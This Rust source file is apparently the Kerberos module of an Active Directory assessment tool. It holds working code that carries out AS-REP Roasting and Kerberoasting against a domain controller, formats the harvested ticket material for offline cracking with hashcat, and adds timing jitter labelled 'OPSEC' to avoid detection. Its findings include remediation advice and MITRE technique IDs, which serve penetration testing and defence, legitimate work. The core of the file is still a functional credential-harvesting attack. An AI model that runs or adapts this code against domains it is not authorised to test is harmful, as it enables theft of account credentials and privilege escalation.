pub mod asreq;
pub mod crypto;
pub mod hashcat;
pub mod tgsreq;

use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use rand::Rng;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use crate::config::Config;
use crate::modules::{DiagnosticModule, LdapContext};
use crate::report::{Finding, Severity};

use self::asreq::{build_asrep_roast_request, parse_kdc_response, KdcResponse};
use self::hashcat::format_asrep_18200;
use self::tgsreq::{build_authenticated_asreq, decrypt_asrep, kerberoast, TgtSession};

pub struct KerberosModule {
    pub ldap_ctx: LdapContext,
}

impl KerberosModule {
    pub fn new(ldap_ctx: LdapContext) -> Self {
        KerberosModule { ldap_ctx }
    }
}

#[async_trait]
impl DiagnosticModule for KerberosModule {
    fn name(&self) -> &'static str {
        "kerberos"
    }

    async fn run(&self, config: Arc<Config>) -> anyhow::Result<Vec<Finding>> {
        let mut findings = Vec::new();
        let dc_addr = config.dc_addr_port88();
        let realm = config.realm();

        // ── AS-REP Roasting ──────────────────────────────────────────────────
        eprintln!("[*] Kerberos: checking {} AS-REP Roasting candidates", self.ldap_ctx.asrep_candidates.len());

        for username in &self.ldap_ctx.asrep_candidates {
            // Generate nonce + jitter delay BEFORE the await so ThreadRng doesn't cross await
            let (nonce, delay_ms) = {
                let n: u32 = rand::random();
                let d: u64 = rand::thread_rng().gen_range(100..=500);
                (n, d)
            };
            let req = build_asrep_roast_request(username, &realm, nonce);

            match mod_send_kerberos_tcp(&dc_addr, &req, config.timeout_secs).await {
                Ok(raw) => match parse_kdc_response(&raw) {
                    Ok(KdcResponse::AsRep(enc)) => {
                        let hash = format_asrep_18200(enc.etype, username, &realm, &enc.cipher);
                        let etype_name = if enc.etype == 23 { "RC4-HMAC (weak)" } else { "AES" };
                        findings.push(Finding::new(
                            format!("KERB-ASREP-{}", username.to_uppercase()),
                            "kerberos",
                            Severity::High,
                            format!("AS-REP Roastable account: {}", username),
                            format!(
                                "Account '{}' has DONT_REQ_PREAUTH set. \
                                 The KDC returned an AS-REP without verifying the user's identity. \
                                 The encrypted part (etype: {}) can be cracked offline.",
                                username, enc.etype
                            ),
                            serde_json::json!({
                                "username": username,
                                "etype": enc.etype,
                                "etype_name": etype_name,
                                "hashcat_hash": hash,
                                "hashcat_mode": 18200,
                            }),
                            Some("Crack offline: hashcat -m 18200 <hash> wordlist.txt. \
                                  If the account has admin privileges, this leads to direct privilege escalation.".into()),
                        )
                        .with_llm_context(format!(
                            "CONFIRMED VULNERABILITY: Account '{}@{}' responded to an AS-REQ \
                             without pre-authentication (DONT_REQ_PREAUTH is set). \
                             Encryption type: {} ({}). \
                             The hashcat_hash in evidence can be run directly against a wordlist \
                             with 'hashcat -m 18200'. \
                             This attack requires zero valid credentials and works from any network position.",
                            username, realm, enc.etype, etype_name
                        ))
                        .with_remediation(vec![
                            "Enable Kerberos pre-authentication: ADUC → Account tab → uncheck 'Do not require Kerberos preauthentication'",
                            "If the account's password is exposed, change it immediately",
                            "Investigate why pre-auth was disabled — escalate to AD team",
                        ])
                        .with_mitre("T1558.004"));
                    }
                    Ok(KdcResponse::PreauthRequired) => {
                        // Normal — account requires preauth
                    }
                    Ok(KdcResponse::Error(code)) => {
                        eprintln!("[!] KRB-ERROR {} for user {}", code, username);
                    }
                    Err(e) => eprintln!("[!] Parse error for {}: {}", username, e),
                },
                Err(e) => eprintln!("[!] Network error for {}: {}", username, e),
            }

            // OPSEC: jitter (already computed before await above)
            tokio::time::sleep(Duration::from_millis(delay_ms)).await;
        }

        // ── Kerberoasting ────────────────────────────────────────────────────
        if !self.ldap_ctx.spn_accounts.is_empty() {
            eprintln!("[*] Kerberos: Kerberoasting {} SPN accounts", self.ldap_ctx.spn_accounts.len());

            let tgt_nonce: u32 = rand::random();
            match acquire_tgt(&config, &dc_addr, &realm, tgt_nonce).await {
                Ok(session) => {
                    let tgs_findings = kerberoast(
                        dc_addr,
                        &config.username,
                        &realm,
                        &session,
                        &self.ldap_ctx.spn_accounts,
                        config.timeout_secs,
                    )
                    .await;
                    findings.extend(tgs_findings);
                }
                Err(e) => {
                    eprintln!("[!] Failed to acquire TGT for Kerberoasting: {}", e);
                    findings.push(Finding::new(
                        "KERB-TGT-FAIL",
                        "kerberos",
                        Severity::Info,
                        "Kerberoasting skipped: TGT acquisition failed",
                        format!("Could not obtain TGT: {}. Kerberoasting requires valid credentials.", e),
                        serde_json::Value::Null,
                        None,
                    ));
                }
            }
        }

        Ok(findings)
    }
}

/// Authenticate to the KDC and return session information for subsequent TGS-REQs.
async fn acquire_tgt(
    config: &Arc<Config>,
    dc_addr: &SocketAddr,
    realm: &str,
    nonce: u32,
) -> anyhow::Result<TgtSession> {
    let req = build_authenticated_asreq(&config.username, realm, &config.password, nonce);

    let raw = mod_send_kerberos_tcp(dc_addr, &req, config.timeout_secs).await?;

    let response = parse_kdc_response(&raw)
        .map_err(|e| anyhow::anyhow!("Failed to parse AS-REP: {}", e))?;

    match response {
        KdcResponse::AsRep(enc) => {
            // Decrypt to get session key
            let session_key = decrypt_asrep(&enc.cipher, &config.password)
                .map_err(|e| anyhow::anyhow!("AS-REP decryption failed: {}", e))?;

            // Extract the Ticket from the AS-REP for use in TGS-REQ
            let ticket_der = extract_ticket_from_asrep(&raw)
                .unwrap_or_default();

            Ok(TgtSession { ticket_der, session_key })
        }
        KdcResponse::PreauthRequired => {
            anyhow::bail!("Preauth required but wasn't provided — this shouldn't happen")
        }
        KdcResponse::Error(code) => {
            anyhow::bail!("KDC returned error code {} (e.g. 24=wrong password, 6=no user)", code)
        }
    }
}

/// Extract the raw Ticket DER bytes from an AS-REP for inclusion in TGS-REQ.
fn extract_ticket_from_asrep(data: &[u8]) -> anyhow::Result<Vec<u8>> {
    use asreq::{find_context_tag, unwrap_sequence_pub};

    // AS-REP: [APPLICATION 11] SEQUENCE { ... [5] ticket Ticket ... }
    if data.is_empty() || data[0] != 0x6b {
        anyhow::bail!("Not an AS-REP");
    }
    let (_, inner, _) = read_tlv(data)?;
    let seq = unwrap_sequence_pub(inner)?;
    let ticket_field = find_context_tag(seq, 5)
        .ok_or_else(|| anyhow::anyhow!("ticket [5] not found in AS-REP"))?;
    Ok(ticket_field.to_vec())
}

fn read_tlv(data: &[u8]) -> anyhow::Result<(u8, &[u8], &[u8])> {
    if data.is_empty() {
        anyhow::bail!("Empty data");
    }
    let tag = data[0];
    let (len, rest) = read_length(&data[1..])?;
    if rest.len() < len {
        anyhow::bail!("TLV truncated");
    }
    Ok((tag, &rest[..len], &rest[len..]))
}

fn read_length(data: &[u8]) -> anyhow::Result<(usize, &[u8])> {
    if data.is_empty() {
        anyhow::bail!("Empty data reading length");
    }
    if data[0] & 0x80 == 0 {
        return Ok((data[0] as usize, &data[1..]));
    }
    let n = (data[0] & 0x7f) as usize;
    if data.len() < 1 + n {
        anyhow::bail!("Truncated length");
    }
    let mut len = 0usize;
    for &b in &data[1..=n] {
        len = (len << 8) | b as usize;
    }
    Ok((len, &data[1 + n..]))
}

/// Send a framed Kerberos message over TCP and receive the response.
/// The 4-byte big-endian length prefix is handled on both send and receive.
pub async fn mod_send_kerberos_tcp(
    addr: &SocketAddr,
    framed_request: &[u8],
    timeout_secs: u64,
) -> anyhow::Result<Vec<u8>> {
    let mut stream = tokio::time::timeout(
        Duration::from_secs(timeout_secs),
        TcpStream::connect(addr),
    )
    .await
    .map_err(|_| anyhow::anyhow!("Connection timeout to {}", addr))?
    .map_err(|e| anyhow::anyhow!("TCP connect to {} failed: {}", addr, e))?;

    // Send (already framed by caller)
    tokio::time::timeout(Duration::from_secs(timeout_secs), stream.write_all(framed_request))
        .await
        .map_err(|_| anyhow::anyhow!("Send timeout"))?
        .map_err(|e| anyhow::anyhow!("Send error: {}", e))?;

    // Read 4-byte length prefix
    let mut len_buf = [0u8; 4];
    tokio::time::timeout(Duration::from_secs(timeout_secs), stream.read_exact(&mut len_buf))
        .await
        .map_err(|_| anyhow::anyhow!("Receive timeout reading length"))?
        .map_err(|e| anyhow::anyhow!("Receive error: {}", e))?;

    let body_len = u32::from_be_bytes(len_buf) as usize;
    if body_len > 1024 * 1024 {
        anyhow::bail!("Suspiciously large Kerberos response: {} bytes", body_len);
    }

    let mut body = vec![0u8; body_len];
    tokio::time::timeout(Duration::from_secs(timeout_secs), stream.read_exact(&mut body))
        .await
        .map_err(|_| anyhow::anyhow!("Receive timeout reading body"))?
        .map_err(|e| anyhow::anyhow!("Receive error: {}", e))?;

    Ok(body)
}
